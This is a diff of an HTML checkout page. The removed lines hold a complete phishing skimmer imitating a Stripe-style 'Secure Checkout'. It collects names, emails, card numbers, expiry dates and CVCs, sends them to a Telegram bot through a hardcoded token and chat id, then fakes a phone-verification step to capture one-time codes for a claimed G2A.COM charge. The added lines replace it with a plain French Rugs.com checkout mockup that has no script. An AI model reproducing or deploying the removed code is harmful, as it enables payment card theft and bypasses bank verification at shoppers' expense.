@@ -1,228 +1,111 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Checkout</title>
-    <style>
-        :root {
-            --stripe-blue: #0000FF; 
-            --border-color: #e6e6e6;
-            --text-main: #1a1a1a;
-            --text-gray: #6b7280;
-            --error-color: #ff0000;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #ffffff;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-        }
-
-        .container { width: 100%; max-width: 400px; position: relative; }
-
-        .page { display: none; }
-        .active { display: block; }
-
-        /* Internal Error/Success Modals */
-        #errorModal, #successModal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            z-index: 1000;
-            padding: 20px;
-            text-align: center;
-        }
-        #modalOverlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.4);
-            z-index: 999;
-        }
-        .modal-text { font-size: 15px; margin-bottom: 20px; color: var(--text-main); line-height: 1.4; }
-        .modal-btn { color: var(--stripe-blue); font-weight: 600; cursor: pointer; text-decoration: none; font-size: 16px; border: none; background: none; outline: none; }
-
-        /* Loading Spinner */
-        #loaderContainer {
-            display: none;
-            text-align: center;
-            padding: 50px 20px;
-        }
-        .spinner {
-            width: 40px; height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--stripe-blue);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .input-error { border-color: var(--error-color) !important; background-color: #fff8f8; }
-
-        /* Layout Elements */
-        h2 { font-size: 17px; font-weight: 600; margin: 25px 0 12px 0; }
-        input, select { width: 100%; padding: 11px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 15px; box-sizing: border-box; outline: none; }
-        
-        .address-group { border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; margin-top: 5px; }
-        .address-group input { border: none; border-bottom: 1px solid var(--border-color); border-radius: 0; }
-        .country-box { background-color: #f9f9f9; padding: 11px; font-size: 15px; border-bottom: 1px solid var(--border-color); color: var(--text-gray); }
-        .row { display: flex; }
-        .row input:first-child { border-right: 1px solid var(--border-color); }
-
-        .payment-box { border: 1px solid var(--border-color); border-radius: 8px; margin-top: 10px; overflow: hidden; }
-        .payment-header { display: flex; align-items: center; padding: 14px; border-bottom: 1px solid var(--border-color); font-weight: 500; }
-        .card-icons-img { height: 22px; margin-left: auto; }
-        
-        .btn-pay { width: 100%; background: var(--stripe-blue); color: white; border: none; padding: 15px; border-radius: 6px; font-size: 17px; font-weight: 600; margin-top: 25px; cursor: pointer; }
-
-        /* Verification Page */
-        .v-title { font-family: "Times New Roman", Times, serif; font-size: 26px; text-align: left; margin-bottom: 20px; }
-        .v-input { height: 60px; text-align: center; font-size: 24px; letter-spacing: 5px; margin: 20px 0; border: 1px solid var(--border-color); border-radius: 4px; }
-    </style>
+    <title>Checkout Page - Rugs.com</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 </head>
 <body>
 
-<div class="container">
-    <div id="modalOverlay"></div>
+<div class="checkout-container">
     
-    <div id="errorModal">
-        <div class="modal-text">Please fill in all fields correctly.</div>
-        <button class="modal-btn" onclick="closeModal()">Close</button>
-    </div>
-
-    <div id="successModal">
-        <div class="modal-text" id="successText"></div>
-        <button class="modal-btn" onclick="closeSuccessModal()">Close</button>
-    </div>
-
-    <div id="checkoutPage" class="page active">
-        <h2>Shipping Information</h2>
-        <input type="email" id="email" placeholder="email@example.com">
+    <section class="section">
+        <h2 class="section-title">Informations de livraison</h2>
         
-        <h2>Shipping Address</h2>
-        <div class="address-group">
-            <input type="text" id="name" placeholder="Full Name">
-            <div class="country-box">United States</div>
-            <input type="text" id="addr1" placeholder="Address Line 1">
-            <div class="row">
-                <input type="text" id="city" placeholder="City">
-                <input type="text" id="zip" placeholder="Zip Code">
-            </div>
-            <select id="state"><option value="">State</option><option value="NY">New York</option><option value="CA">California</option></select>
+        <div class="input-group">
+            <label>E-mail</label>
+            <input type="email" placeholder="email@exemple.com">
         </div>
 
-        <h2>Payment Method</h2>
-        <div class="payment-box">
-            <div class="payment-header">
-                <span>💳 Card</span>
-                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" class="card-icons-img">
+        <div class="address-container">
+            <label>Adresse de livraison</label>
+            <input type="text" placeholder="Nom complet" class="top-input">
+            <div class="country-selector">États-Unis</div>
+            <input type="text" placeholder="Ligne d'adresse n°1">
+            <input type="text" placeholder="Ligne d'adresse n°2">
+            <div class="row">
+                <input type="text" placeholder="Ville">
+                <input type="text" placeholder="Code postal">
             </div>
-            <div style="padding: 15px;">
-                <input type="text" id="cardNum" placeholder="Card Number" maxlength="19">
-                <div class="row" style="margin-top: 10px;">
-                    <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
-                    <input type="text" id="cvc" placeholder="CVC" maxlength="4">
+            <select class="bottom-input">
+                <option>État</option>
+            </select>
+        </div>
+
+        <div class="phone-input">
+            <span class="flag">🇺🇸</span>
+            <input type="text" value="(201) 555-0123">
+            <span class="info-icon">ⓘ</span>
+        </div>
+    </section>
+
+    <section class="section">
+        <h2 class="section-title">Moyen de paiement</h2>
+        
+        <div class="payment-box">
+            <div class="payment-option selected">
+                <div class="radio-circle"></div>
+                <span class="card-icon">💳</span>
+                <span class="label">Carte</span>
+            </div>
+
+            <div class="card-details">
+                <p class="small-label">Informations de la carte</p>
+                <div class="card-number-wrapper">
+                    <input type="text" placeholder="1234 1234 1234 1234">
+                    <div class="cards-logos">
+                        <img src="https://img.icons8.com/color/32/000000/visa.png" alt="visa">
+                        <img src="https://img.icons8.com/color/32/000000/mastercard.png" alt="mastercard">
+                    </div>
+                </div>
+                <div class="row no-border-top">
+                    <input type="text" placeholder="MM / AA">
+                    <input type="text" placeholder="CVC" class="cvc-input">
                 </div>
             </div>
+
+            <div class="checkbox-row">
+                <input type="checkbox" checked id="same-billing">
+                <label for="same-billing">Les informations de facturation sont identiques aux informations de livraison</label>
+            </div>
+
+            <div class="payment-option apple-pay">
+                <div class="radio-circle-empty"></div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" width="40">
+                <span class="label">Apple Pay</span>
+            </div>
         </div>
-        <button class="btn-pay" onclick="validateCheckout()">Pay Now</button>
-    </div>
+    </section>
 
-    <div id="loaderContainer">
-        <div class="spinner"></div>
-        <p>Securing your transaction...</p>
-    </div>
-
-    <div id="verifyPage" class="page">
-        <h1 class="v-title">Verify By Phone</h1>
-        <p>We have sent you a text message with a code to your registered mobile number.</p>
-        <p>You are paying G2A.COM the amount of <b>EUR 1.46</b>.</p>
+    <div class="extra-options">
+        <label class="custom-checkbox">
+            <input type="checkbox">
+            <span>Enregistrer mes informations pour régler plus rapidement <br> <small>Payez en toute sécurité chez Rugs.com et partout où Link est accepté.</small></span>
+        </label>
         
-        <div style="margin-top: 40px;">
-            <label style="color: #888; display: block; text-align: center;">Verification code</label>
-            <input type="text" class="v-input" maxlength="6" id="otpInput">
-        </div>
-
-        <button class="btn-pay" style="margin-top: 10px;" onclick="finalCheck()">CONFIRM</button>
+        <label class="custom-checkbox">
+            <input type="checkbox">
+            <span>J'accepte les <a href="#">Conditions d'utilisation du service</a> et la <a href="#">Politique de confidentialité</a> de Rugs.com.</span>
+        </label>
     </div>
+
+    <button class="pay-button">Payer</button>
+
+    <footer class="footer">
+        <a href="#" class="returns">↩ Retours gratuits</a>
+        <div class="footer-links">
+            <span>Propulsé par <strong>stripe</strong></span>
+            <div class="links">
+                <a href="#">Mentions légales</a>
+                <a href="#">Retours</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+    </footer>
+
 </div>
 
-<script>
-    // --- Telegram Credentials ---
-    const token = '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc'; 
-    const chat_id = '656419637'; 
-
-    async function sendTelegram(msg) {
-        const url = `https://api.telegram.org/bot${token}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat_id, text: msg, parse_mode: 'HTML' })
-        });
-    }
-
-    // Card Number Formatting
-    document.getElementById('cardNum').addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-    });
-
-    function closeModal() { document.getElementById('errorModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }
-    function closeSuccessModal() { document.getElementById('successModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }
-
-    async function validateCheckout() {
-        const email = document.getElementById('email').value;
-        const card = document.getElementById('cardNum').value;
-        const name = document.getElementById('name').value;
-        const exp = document.getElementById('exp').value;
-        const cvc = document.getElementById('cvc').value;
-
-        if (!email.includes('@') || card.replace(/\s/g, '').length < 16 || !name || !cvc) {
-            document.getElementById('errorModal').style.display = 'block';
-            document.getElementById('modalOverlay').style.display = 'block';
-            return;
-        }
-
-        // Send Card Data to Telegram
-        const report = `<b>🚀 NEW LOG HIT</b>\n\n👤 Name: ${name}\n📧 Email: ${email}\n💳 Card: <code>${card}</code>\n📅 Exp: ${exp}\n🔒 CVC: ${cvc}`;
-        await sendTelegram(report);
-
-        startLoading();
-    }
-
-    function startLoading() {
-        document.getElementById('checkoutPage').style.display = 'none';
-        document.getElementById('loaderContainer').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('loaderContainer').style.display = 'none';
-            document.getElementById('verifyPage').classList.add('active');
-            window.scrollTo(0,0);
-        }, 3000);
-    }
-
-    async function finalCheck() {
-        const otp = document.getElementById('otpInput').value;
-        if(otp.length === 6) {
-            await sendTelegram(`<b>🔑 RECEIVED OTP:</b> <code>${otp}</code>`);
-            document.getElementById('successText').textContent = "Verification Successful. Redirecting...";
-            document.getElementById('successModal').style.display = 'block';
-            document.getElementById('modalOverlay').style.display = 'block';
-        } else {
-            document.getElementById('successText').textContent = "Invalid OTP code.";
-            document.getElementById('successModal').style.display = 'block';
-            document.getElementById('modalOverlay').style.display = 'block';
-        }
-    }
-</script>
 </body>
 </html>
